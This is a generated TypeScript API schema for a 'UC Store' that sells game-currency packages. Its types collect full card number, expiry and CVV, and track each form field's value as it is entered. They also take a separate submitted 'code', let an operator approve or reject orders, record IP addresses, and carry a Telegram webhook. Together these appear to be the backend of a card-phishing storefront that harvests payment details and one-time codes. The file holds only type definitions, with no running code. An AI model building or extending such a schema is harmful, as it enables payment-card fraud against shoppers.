# lib/api-client-react/src/generated/api.schemas.ts
/**
 * Generated by orval v8.5.3 🍺
 * Do not edit manually.
 * Api
 * UC Store API
 * OpenAPI spec version: 0.1.0
 */
export interface HealthStatus {
  status: string;
}

export interface CreateOrderRequest {
  productId: string;
  productName: string;
  price: number;
  quantity: number;
}

export interface SubmitContactRequest {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  whatsapp: string;
  name?: string;
}

export interface TrackFieldRequest {
  fieldName: string;
  fieldValue: string;
}

export interface SubmitCodeRequest {
  code: string;
}

export type DecideOrderRequestDecision =
  (typeof DecideOrderRequestDecision)[keyof typeof DecideOrderRequestDecision];

export const DecideOrderRequestDecision = {
  approved: "approved",
  rejected: "rejected",
} as const;

export interface DecideOrderRequest {
  decision: DecideOrderRequestDecision;
}

export type ExchangeRatePackagesItem = {
  id: string;
  name: string;
  faceValue: number;
  price: number;
};

export interface ExchangeRate {
  rate: number;
  packages: ExchangeRatePackagesItem[];
}

export type OrderStatus = (typeof OrderStatus)[keyof typeof OrderStatus];

export const OrderStatus = {
  pending: "pending",
  contact_submitted: "contact_submitted",
  code_submitted: "code_submitted",
  approved: "approved",
  rejected: "rejected",
} as const;

export interface Order {
  id: string;
  productId: string;
  productName: string;
  price: number;
  quantity: number;
  whatsapp?: string;
  name?: string;
  code?: string;
  status: OrderStatus;
  ipAddress?: string;
  createdAt: string;
}

export type TrackField200 = {
  ok?: boolean;
};

export type TelegramWebhookBody = { [key: string]: unknown };

export type TelegramWebhook200 = {
  ok?: boolean;
};